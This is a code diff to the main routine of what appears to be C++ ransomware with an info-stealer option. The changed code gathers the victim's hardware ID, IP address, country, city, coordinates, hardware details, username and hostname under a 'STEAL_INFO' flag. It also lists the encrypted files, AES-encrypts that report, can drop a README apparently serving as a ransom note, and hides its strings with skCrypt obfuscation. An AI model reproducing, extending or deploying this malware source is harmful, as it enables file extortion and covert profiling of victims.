@@ -66,32 +66,39 @@ int main(int argc, char* argv[])
         threads[i].join();
 
 
-    string infoFileContent = "";
-    infoFileContent += (string)skCrypt("Key: ") + key + (string)skCrypt("\n");
-    if (STEAL_INFO) { //User infos = semi-stealer
-        infoFileContent += (string)skCrypt("Date: ") + getDate() + (string)skCrypt("\n");
-        infoFileContent += (string)skCrypt("HWID: ") + getHWID() + (string)skCrypt("\n");
+    string infoFileContent = (string)skCrypt("");
+    string info_txt = (string)skCrypt("");
+    info_txt += (string)skCrypt("Key: ") + key + (string)skCrypt("\n");
+    if (STEAL_INFO) { //User infos -> semi-stealer
+        info_txt += (string)skCrypt("Date: ") + getDate() + (string)skCrypt("\n");
+        info_txt += (string)skCrypt("HWID: ") + getHWID() + (string)skCrypt("\n");
         vector<string> ipData = split(getIPData(), '\n');
-        infoFileContent += (string)skCrypt("IP: ") + ipData[0] + (string)skCrypt("\n");
-        infoFileContent += (string)skCrypt("Country: ") + ipData[1] + (string)skCrypt("\n");
-        infoFileContent += (string)skCrypt("City: ") + ipData[2] + (string)skCrypt("\n");
-        infoFileContent += (string)skCrypt("Latitude: ") + ipData[3] + (string)skCrypt("\n");
-        infoFileContent += (string)skCrypt("Longitude: ") + ipData[3] + (string)skCrypt("\n");
+        info_txt += (string)skCrypt("IP: ") + ipData[0] + (string)skCrypt("\n");
+        info_txt += (string)skCrypt("Country: ") + ipData[1] + (string)skCrypt("\n");
+        info_txt += (string)skCrypt("City: ") + ipData[2] + (string)skCrypt("\n");
+        info_txt += (string)skCrypt("Latitude: ") + ipData[3] + (string)skCrypt("\n");
+        info_txt += (string)skCrypt("Longitude: ") + ipData[4] + (string)skCrypt("\n");
         vector<string> systemData = split(getCPU(), '\n');
-        infoFileContent += (string)skCrypt("CPU name: ") + systemData[0] + (string)skCrypt("\n");
-        infoFileContent += (string)skCrypt("CPU threads: ") + systemData[1] + (string)skCrypt("\n");
-        infoFileContent += (string)skCrypt("Ram memory: ") + systemData[2] + (string)skCrypt("\n");
-        infoFileContent += (string)skCrypt("GPU name: ") + getGPU() + (string)skCrypt("\n");
-        infoFileContent += (string)skCrypt("Host name: ") + getPcName() + (string)skCrypt("\n");
-        infoFileContent += (string)skCrypt("Username: ") + getUserName() + (string)skCrypt("\n");
-        infoFileContent += (string)skCrypt("Screen resolution: ") + getResolution() + (string)skCrypt("\n");
-        infoFileContent += (string)skCrypt("Windows version: ") + getWinVersion() + (string)skCrypt("\n");
-        infoFileContent += (string)skCrypt("Language: ") + getLanguage() + (string)skCrypt("\n");
-        infoFileContent += (string)skCrypt("Crypted files:\n");
-        for (string file : files)
-            infoFileContent += file + (string)skCrypt("\n");
+        info_txt += (string)skCrypt("CPU name: ") + systemData[0] + (string)skCrypt("\n");
+        info_txt += (string)skCrypt("CPU threads: ") + systemData[1] + (string)skCrypt("\n");
+        info_txt += (string)skCrypt("Ram memory: ") + systemData[2] + (string)skCrypt("\n");
+        info_txt += (string)skCrypt("GPU name: ") + getGPU() + (string)skCrypt("\n");
+        info_txt += (string)skCrypt("Host name: ") + getPcName() + (string)skCrypt("\n");
+        info_txt += (string)skCrypt("Username: ") + getUserName() + (string)skCrypt("\n");
+        info_txt += (string)skCrypt("Screen resolution: ") + getResolution() + (string)skCrypt("\n");
+        info_txt += (string)skCrypt("Windows version: ") + getWinVersion() + (string)skCrypt("\n");
+        info_txt += (string)skCrypt("Language: ") + getLanguage() + (string)skCrypt("\n");
     }
-    infoFileContent = aes_encrypt(KEY, infoFileContent, IV);
+    info_txt = aes_encrypt(KEY, info_txt, IV);
+    infoFileContent += info_txt;
+    infoFileContent += skCrypt("\n");
+
+    string cryptedFiles_txt = (string)skCrypt("");
+    for (string file : files)
+        cryptedFiles_txt += file + (string)skCrypt("\n");
+    cryptedFiles_txt = aes_encrypt(KEY, cryptedFiles_txt, IV);
+    infoFileContent += cryptedFiles_txt;
+    infoFileContent += skCrypt("\n");
 
 
     if (DROP_README)
@@ -132,7 +139,8 @@ int main(int argc, char* argv[])
 
     /*debug output*/
     if (DEBUG) {
-        cout << skCrypt("\nEncoded ") << aes_decrypt(KEY, infoFileContent, IV) << skCrypt("\n");
+        cout << skCrypt("\nEncoded ") << aes_decrypt(KEY, info_txt, IV) << skCrypt("\n");
+        cout << skCrypt("Crypted files:\n") << aes_decrypt(KEY, cryptedFiles_txt, IV) << skCrypt("\n");
         Sleep(5000);
         system("pause");
     }
